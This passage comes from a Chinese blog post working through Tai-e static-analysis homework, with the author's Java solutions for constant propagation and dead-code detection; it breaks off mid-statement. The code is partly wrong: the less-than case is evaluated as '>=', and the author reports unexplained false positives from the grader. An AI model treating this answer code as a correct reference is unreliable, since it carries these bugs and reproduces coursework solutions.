DefinitionStmt&lt;?,?&gt;) &#123;</span><br><span class="line">        <span class="type">LValue</span> <span class="variable">lv</span> <span class="operator">=</span> ((DefinitionStmt&lt;?, ?&gt;) stmt).getLValue();</span><br><span class="line">        <span class="type">RValue</span> <span class="variable">rv</span> <span class="operator">=</span> ((DefinitionStmt&lt;?, ?&gt;) stmt).getRValue();</span><br><span class="line">        <span class="keyword">if</span> (lv <span class="keyword">instanceof</span> Var &amp;&amp; canHoldInt((Var)lv))&#123;</span><br><span class="line">            <span class="type">CPFact</span> <span class="variable">tf</span> <span class="operator">=</span> in.copy();</span><br><span class="line">            tf.update((Var)lv, evaluate(rv, in));</span><br><span class="line">            <span class="keyword">return</span> out.copyFrom(tf);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> out.copyFrom(in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Value <span class="title function_">evaluate</span><span class="params">(Exp exp, CPFact in)</span> &#123;</span><br><span class="line">    <span class="type">Value</span> <span class="variable">v</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (exp <span class="keyword">instanceof</span> IntLiteral) &#123;</span><br><span class="line">        <span class="comment">// x = c</span></span><br><span class="line">        v = Value.makeConstant(((IntLiteral) exp).getValue());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (exp <span class="keyword">instanceof</span> Var) &#123;</span><br><span class="line">        <span class="comment">// x = y</span></span><br><span class="line">        v = in.get((Var) exp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (exp <span class="keyword">instanceof</span> BinaryExp) &#123;</span><br><span class="line">        <span class="comment">// x = y op z</span></span><br><span class="line">        <span class="keyword">if</span> (exp <span class="keyword">instanceof</span> ArithmeticExp) &#123;</span><br><span class="line">            <span class="comment">// + - * / %</span></span><br><span class="line">            <span class="type">Value</span> <span class="variable">left</span> <span class="operator">=</span> in.get(((ArithmeticExp) exp).getOperand1());</span><br><span class="line">            <span class="type">Value</span> <span class="variable">right</span> <span class="operator">=</span> in.get(((ArithmeticExp) exp).getOperand2());</span><br><span class="line">            ArithmeticExp.<span class="type">Op</span> <span class="variable">op</span> <span class="operator">=</span> ((ArithmeticExp) exp).getOperator();</span><br><span class="line">            <span class="keyword">if</span> ((op == ArithmeticExp.Op.DIV || op == ArithmeticExp.Op.REM) &amp;&amp; right.isConstant() &amp;&amp; right.getConstant() == <span class="number">0</span>) &#123;</span><br><span class="line">                v = Value.getUndef();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left.isConstant() &amp;&amp; right.isConstant()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (op == ArithmeticExp.Op.ADD)</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() + right.getConstant());</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (op == ArithmeticExp.Op.SUB)</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() - right.getConstant());</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (op == ArithmeticExp.Op.MUL)</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() * right.getConstant());</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (op == ArithmeticExp.Op.DIV)</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() / right.getConstant());</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    v = Value.makeConstant(left.getConstant() % right.getConstant());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left.isNAC() || right.isNAC()) &#123;</span><br><span class="line">                v = Value.getNAC();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                v = Value.getUndef();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (exp <span class="keyword">instanceof</span> ConditionExp) &#123;</span><br><span class="line">            <span class="comment">// == != &lt; &gt; &lt;= &gt;=</span></span><br><span class="line">            <span class="type">Value</span> <span class="variable">left</span> <span class="operator">=</span> in.get(((ConditionExp) exp).getOperand1());</span><br><span class="line">            <span class="type">Value</span> <span class="variable">right</span> <span class="operator">=</span> in.get(((ConditionExp) exp).getOperand2());</span><br><span class="line">            ConditionExp.<span class="type">Op</span> <span class="variable">op</span> <span class="operator">=</span> ((ConditionExp) exp).getOperator();</span><br><span class="line">            <span class="keyword">if</span> (left.isConstant() &amp;&amp; right.isConstant()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (op == ConditionExp.Op.EQ) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (left.getConstant() == right.getConstant())</span><br><span class="line">                        v = Value.makeConstant(<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        v = Value.makeConstant(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ConditionExp.Op.GE) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (left.getConstant() &gt;= right.getConstant())</span><br><span class="line">                        v = Value.makeConstant(<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        v = Value.makeConstant(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ConditionExp.Op.LE) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (left.getConstant() &lt;= right.getConstant())</span><br><span class="line">                        v = Value.makeConstant(<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        v = Value.makeConstant(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ConditionExp.Op.GT) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (left.getConstant() &gt; right.getConstant())</span><br><span class="line">                        v = Value.makeConstant(<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        v = Value.makeConstant(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ConditionExp.Op.LT) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (left.getConstant() &gt;= right.getConstant())</span><br><span class="line">                        v = Value.makeConstant(<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        v = Value.makeConstant(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ConditionExp.Op.NE) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (left.getConstant() != right.getConstant())</span><br><span class="line">                        v = Value.makeConstant(<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        v = Value.makeConstant(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left.isNAC() || right.isNAC()) &#123;</span><br><span class="line">                v = Value.getNAC();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                v = Value.getUndef();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (exp <span class="keyword">instanceof</span> ShiftExp) &#123;</span><br><span class="line">            <span class="comment">// &lt;&lt; &gt;&gt; &gt;&gt;&gt;</span></span><br><span class="line">            <span class="type">Value</span> <span class="variable">left</span> <span class="operator">=</span> in.get(((ShiftExp) exp).getOperand1());</span><br><span class="line">            <span class="type">Value</span> <span class="variable">right</span> <span class="operator">=</span> in.get(((ShiftExp) exp).getOperand2());</span><br><span class="line">            ShiftExp.<span class="type">Op</span> <span class="variable">op</span> <span class="operator">=</span> ((ShiftExp) exp).getOperator();</span><br><span class="line">            <span class="keyword">if</span> (left.isConstant() &amp;&amp; right.isConstant()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (op == ShiftExp.Op.SHL) &#123;</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() &lt;&lt; right.getConstant());</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ShiftExp.Op.SHR) &#123;</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() &gt;&gt; right.getConstant());</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ShiftExp.Op.USHR) &#123;</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() &gt;&gt;&gt; right.getConstant());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left.isNAC() || right.isNAC()) &#123;</span><br><span class="line">                v = Value.getNAC();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                v = Value.getUndef();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (exp <span class="keyword">instanceof</span> BitwiseExp) &#123;</span><br><span class="line">            <span class="comment">// | &amp; ^</span></span><br><span class="line">            <span class="type">Value</span> <span class="variable">left</span> <span class="operator">=</span> in.get(((BitwiseExp) exp).getOperand1());</span><br><span class="line">            <span class="type">Value</span> <span class="variable">right</span> <span class="operator">=</span> in.get(((BitwiseExp) exp).getOperand2());</span><br><span class="line">            BitwiseExp.<span class="type">Op</span> <span class="variable">op</span> <span class="operator">=</span> ((BitwiseExp) exp).getOperator();</span><br><span class="line">            <span class="keyword">if</span> (left.isConstant() &amp;&amp; right.isConstant()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (op == BitwiseExp.Op.OR) &#123;</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() | right.getConstant());</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == BitwiseExp.Op.AND) &#123;</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() &amp; right.getConstant());</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == BitwiseExp.Op.XOR) &#123;</span><br><span class="line">                    v = Value.makeConstant(left.getConstant() ^ right.getConstant());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left.isNAC() || right.isNAC()) &#123;</span><br><span class="line">                v = Value.getNAC();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                v = Value.getUndef();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;unexpect BinaryExp&quot;</span>);</span><br><span class="line">            v = Value.getNAC();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;unexpect Type&quot;</span>);</span><br><span class="line">        v = Value.getNAC();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-死代码检测"><a href="#0x03-死代码检测" class="headerlink" title="0x03 死代码检测"></a>0x03 死代码检测</h2><p>&emsp;除去程序中的死代码，通过组合前两次作业的分析方法来检测死代码。死代码指的是程序中不会被执行的代码，或者执行结果永远不会被其他计算过程用到的代码。本次作业只关心两种死代码：<code>不可达代码与无用赋值</code>。</p><p>&emsp;不可达代码分为<code>分支不可达代码</code>与<code>控制流不可达代码</code>。</p><p>（1）<code>控制流不可达代码（return后的语句）</code>很容易检测：从方法入口开始，遍历CFG并标记可达语句，遍历结束时，没有被标记的语句就是控制流不可达的。</p><p>（2）对于<code>分支不可达代码（常量if判断）</code>，需要预先对被检测代码应用常量传播分析，通过它来告诉我们条件值是否为常量，然后在遍历 CFG 时，不进入相应的不可达分支。</p><p>&emsp;无用赋值：局部变量在一条语句中被赋值，但再也没有该语句后面的语句读取。<code>我们需要对被检测的代码实施活跃变量分析，如果赋值语句左侧的变量是无用变量，则可以标记为无用赋值。但有一个例外，例如x=m()，即使x没有被用到，但是m()方法可能有副作用，可能改变了其他的某些值，因此不能被删除</code>。</p><h3 id="代码相关的知识点-2"><a href="#代码相关的知识点-2" class="headerlink" title="代码相关的知识点"></a>代码相关的知识点</h3><p>&emsp;本次作业无需关注由于删除死代码而产生的新的子代码，例如，删除line-3与line-5，那么：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">deadAssign</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    a = <span class="number">0</span>;     <span class="comment">// dead assignment</span></span><br><span class="line">    a = <span class="number">1</span>;</span><br><span class="line">    b = a * <span class="number">2</span>; <span class="comment">// dead assignment</span></span><br><span class="line">    c = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;<code>a=1</code>会变为新的死代码。</p><p>&emsp;Tai-e在运行死代码检测之前会自动运行活跃变量分析与常量传播分析，<code>DeadCodeDetection.analyze</code>提供了获得两种分析算法对目标IR进行分析的结果。</p><p>&emsp;任务：完成DeadCodeDetection的analyze API，以IR作为输入，输出IR中死代码的集合。</p><ul><li><code>pascal.taie.analysis.graph.cfg.Edge</code>。</li></ul><p>&emsp;表示CFG中的边，使用方法<code>getKind()</code>可以得知边的种类。CFG中的节点是Stmt，边的种类与作业相关的有4种（<code>IF_TRUE/IF_FALSE/SWITCH_CASE/SWITCH_DEFAULT</code>），如下所示：</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20231201211714610.png" alt="image-20231201211714610" style="zoom:67%;" /></p><p><img src="/images/tai-e-static-analysis-with-homework/image-20231201211907323.png" alt="image-20231201211907323" style="zoom:67%;" /></p><ul><li><code>pascal.taie.ir.stmt.If</code>。</li></ul><p>&emsp;Stmt的子类，表示程序中的if语句。while循环与for循环在Tai-e的IR中会被转换为If语句。</p><ul><li><code>pascal.taie.ir.stmt.SwitchStmt</code>。</li></ul><p>&emsp;Stmt的子类，表示程序中的switch语句。</p><ul><li><code>pascal.taie.ir.stmt.AssignStmt</code>。</li></ul><p>&emsp;表示程序中的赋值语句，其与<code>pascal.taie.ir.stmt.DefinitionStmt</code>的关系为：</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20231201212515325.png" alt="image-20231201212515325" style="zoom:67%;" /></p><h3 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h3><p><img src="/images/tai-e-static-analysis-with-homework/image-20231202161353402.png" alt="image-20231202161353402" style="zoom:67%;" /></p><h3 id="作业代码-2"><a href="#作业代码-2" class="headerlink" title="作业代码"></a>作业代码</h3><p>&emsp;结果显示，表明有误报。没太理解这里面的误报是什么意思？不就是和答案相比较么？</p><p><img src="/images/tai-e-static-analysis-with-homework/image-20231202160951714.png" alt="image-20231202160951714" style="zoom:67%;" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DeadCodeDetection.java</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Set&lt;Stmt&gt; <span class="title function_">analyze</span><span class="params">(IR ir)</span> &#123;</span><br><span class="line">    <span class="comment">// obtain CFG</span></span><br><span class="line">    CFG&lt;Stmt&gt; cfg = ir.getResult(CFGBuilder.ID);</span><br><span class="line">    <span class="comment">// obtain result of constant propagation</span></span><br><span class="line">    DataflowResult&lt;Stmt, CPFact&gt; constants =</span><br><span class="line">        ir.getResult(ConstantPropagation.ID);</span><br><span class="line">    <span class="comment">// obtain result of live variable analysis</span></span><br><span class="line">    DataflowResult&lt;Stmt, SetFact&lt;Var&gt;&gt; liveVars =</span><br><span class="line">        ir.getResult(LiveVariableAnalysis.ID);</span><br><span class="line">    <span class="comment">// keep statements (dead code) sorted in the resulting set</span></span><br><span class="line">    Set&lt;Stmt&gt; deadCode = <span class="keyword">new</span> <span class="title class_">TreeSet</span>&lt;&gt;(Comparator.comparing(Stmt::getIndex));</span><br><span class="line">    <span class="comment">// TODO - finish me</span></span><br><span class="line">    <span class="comment">// Your task is to recognize dead code in ir and add it to deadCode</span></span><br><span class="line">    Set&lt;Stmt&gt; nodes = cfg.getNodes();</span><br><span class="line">    <span class="keyword">for</span> (Stmt n: nodes) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isDeadCode</span> <span class="operator">=</span> deadCode.contains(n);</span><br><span class="line">        <span class="type">Stmt</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Edge&lt;Stmt&gt; source_edge = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// judge RET</span></span><br><span class="line">        <span class="keyword">if</span> (cfg.getPredsOf(n).isEmpty() &amp;&amp; !cfg.isEntry(n)) &#123;</span><br><span class="line">            entry = n;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// traverse branch and update deadcode set</span></span><br><span class="line">            Set&lt;Stmt&gt; deadcode_set_update = deadcodeSetFromEntry(source_edge, entry, cfg, deadCode);</span><br><span class="line">            deadCode.addAll(deadcode_set_update);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// judge IF &amp; SWITCH</span></span><br><span class="line">        <span class="keyword">if</span> (n <span class="keyword">instanceof</span> If) &#123;</span><br><span class="line">            <span class="comment">// get condition params</span></span><br><span class="line">            <span class="type">ConditionExp</span> <span class="variable">exp</span> <span class="operator">=</span> ((If) n).getCondition();</span><br><span class="line">            <span class="type">Var</span> <span class="variable">op1</span> <span class="operator">=</span> exp.getOperand1();</span><br><span class="line">            <span class="type">Var</span> <span class="variable">op2</span> <span class="operator">=</span> exp.getOperand2();</span><br><span class="line">            ConditionExp.<span class="type">Op</span> <span class="variable">op</span> <span class="operator">=</span> exp.getOperator();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// get op1/op2 value using constant result</span></span><br><span class="line">            <span class="type">CPFact</span> <span class="variable">fact</span> <span class="operator">=</span> constants.getOutFact(n);</span><br><span class="line">            <span class="type">Value</span> <span class="variable">op1_value</span> <span class="operator">=</span> fact.get(op1);</span><br><span class="line">            <span class="type">Value</span> <span class="variable">op2_value</span> <span class="operator">=</span> fact.get(op2);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// judge condition</span></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">is_true</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span> (op1_value.isConstant() &amp;&amp; op2_value.isConstant()) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">op1_constant_value</span> <span class="operator">=</span> op1_value.getConstant();</span><br><span class="line">                <span class="type">int</span> <span class="variable">op2_constant_value</span> <span class="operator">=</span> op2_value.getConstant();</span><br><span class="line">                <span class="keyword">if</span> (op == ConditionExp.Op.EQ) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (op1_constant_value == op2_constant_value)</span><br><span class="line">                        is_true = <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ConditionExp.Op.GE) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (op1_constant_value &gt;= op2_constant_value)</span><br><span class="line">                        is_true = <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ConditionExp.Op.GT) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (op1_constant_value &gt; op2_constant_value)</span><br><span class="line">                        is_true = <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ConditionExp.Op.LE) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (op1_constant_value &lt;= op2_constant_value)</span><br><span class="line">                        is_true = <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == ConditionExp.Op.LT) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (op1_constant_value &lt; op2_constant_value)</span><br><span class="line">                        is_true = <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Condition op error&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (op1_value.isConstant() &amp;&amp; op2_value.isConstant()) &#123;</span><br><span class="line">                <span class="comment">/* update deadcode set */</span></span><br><span class="line">                Set&lt;Edge&lt;Stmt&gt;&gt; edges = cfg.getOutEdgesOf(n);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// ensure deadcode branch entry</span></span><br><span class="line">                <span class="keyword">if</span> (is_true) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (Edge&lt;Stmt&gt; e: edges) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (e.getKind() == Edge.Kind.IF_FALSE) &#123;</span><br><span class="line">                            entry = e.getTarget();</span><br><span class="line">                            source_edge = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">for</span> (Edge&lt;Stmt&gt; e: edges) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (e.getKind() == Edge.Kind.IF_TRUE) &#123;</span><br><span class="line">                            entry = e.getTarget();</span><br><span class="line">                            source_edge = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// traverse branch and update deadcode set</span></span><br><span class="line">                Set&lt;Stmt&gt; deadcode_set_update = deadcodeSetFromEntry(source_edge, entry, cfg, deadCode);</span><br><span class="line">                deadCode.addAll(deadcode_set_update);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n <span class="keyword">instanceof</span> SwitchStmt) &#123;</span><br><span class="line">            <span class="comment">// get params p</span></span><br><span class="line">            <span class="type">Var</span> <span class="variable">p</span> <span class="operator">=</span> ((SwitchStmt) n).getVar();</span><br><span class="line">            Set&lt;Edge&lt;Stmt&gt;&gt; case_condition_edges = cfg.getOutEdgesOf(n);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// get p value using constant result</span></span><br><span class="line">            <span class="type">CPFact</span> <span class="variable">fact</span> <span class="operator">=</span> constants.getOutFact(n);</span><br><span class="line">            <span class="type">Value</span> <span class="variable">p_value</span> <span class="operator">=</span> fact.get(p);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* update deadcode set */</span></span><br><span class="line">            <span class="keyword">if</span> (p_value.isConstant()) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">p_constant_value</span> <span class="operator">=</span> p_value.getConstant();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// judge go CASE or DEFAULT</span></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">exec_default</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">for</span> (Edge&lt;Stmt&gt; e: case_condition_edges) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e.getKind() == Edge.Kind.SWITCH_CASE) &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">case_value</span> <span class="operator">=</span> e.getCaseValue();</span><br><span class="line">                        <span class="keyword">if</span> (p_constant_value == case_value)</span><br><span class="line">                            exec_default = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// update</span></span><br><span class="line">                <span class="keyword">for</span> (Edge&lt;Stmt&gt; e: case_condition_edges) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e.getKind() == Edge.Kind.SWITCH_CASE) &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">case_value</span> <span class="operator">=</span> e.getCaseValue();</span><br><span class="line">                        <span class="comment">// maybe deadcode</span></span><br><span class="line">                        <span class="keyword">if</span> (p_constant_value != case_value) &#123;</span><br><span class="line">                            entry = e.getTarget();</span><br><span class="line">                            source_edge = e;</span><br><span class="line">                            <span class="comment">// traverse branch and update deadcode set</span></span><br><span class="line">                            Set&lt;Stmt&gt; deadcode_set_update = deadcodeSetFromEntry(source_edge, entry, cfg, deadCode);</span><br><span class="line">                            deadCode.addAll(deadcode_set_update);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.getKind() == Edge.Kind.SWITCH_DEFAULT &amp;&amp; !exec_default) &#123;</span><br><span class="line">                        entry = e.getTarget();</span><br><span class="line">                        source_edge = e;</span><br><span class="line">                        <span class="comment">// traverse branch and update deadcode set</span></span><br><span class="line">                        Set&lt;Stmt&gt; deadcode_set_update = deadcodeSetFromEntry(source_edge, entry, cfg, deadCode);</span><br><span class="line">                        deadCode.addAll(deadcode_set_update);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// judge not live and not call</span></span><br><span class="line">        <span class="keyword">if</span> (n <span class="keyword">instanceof</span> 